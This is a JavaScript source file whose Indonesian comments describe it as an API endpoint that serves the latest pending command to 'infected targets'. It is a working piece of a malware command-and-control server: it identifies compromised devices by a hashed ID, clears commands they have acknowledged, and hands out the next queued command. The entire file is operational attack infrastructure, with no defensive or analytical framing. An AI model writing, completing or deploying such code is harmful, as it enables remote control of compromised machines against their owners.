/**
 * FILE: api/command.js
 * Endpoint GET untuk pengambilan command terbaru bagi target yang terinfeksi.
 */

import { getPendingCommand, deleteCommand, getTarget } from '../lib/database.js';
import { hash } from '../lib/crypto.js';

export default async (req, res) => {
  if (req.method !== 'GET') return res.status(405).json({ success: false, error: 'Method Not Allowed' });
  
  try {
    const { deviceId, command_id } = req.query;
    if (!deviceId) return res.status(400).json({ success: false, error: 'Missing Device ID' });
    
    const deviceHash = hash(deviceId);
    const target = await getTarget(deviceHash);
    
    if (!target) return res.status(404).json({ success: false, error: 'Target Not Found' });
    
    // Jika command_id disediakan, berarti command sebelumnya sudah berhasil diterima/dijalankan
    if (command_id) {
      await deleteCommand(deviceHash, command_id);
    }
    
    // Ambil command pending terbaru
    const pendingCmd = await getPendingCommand(deviceHash);
    
    res.status(200).json({
      success: true,
      deviceId: deviceHash,
      command: pendingCmd ? pendingCmd.command : 'NONE',
      commandId: pendingCmd ? pendingCmd.id : null,
      timestamp: Date.now()
    });
    
  } catch (err) {
    console.error('Command Retrieval Error:', err.message);
    res.status(500).json({ success: false, error: 'Internal Server Error' });
  }
};
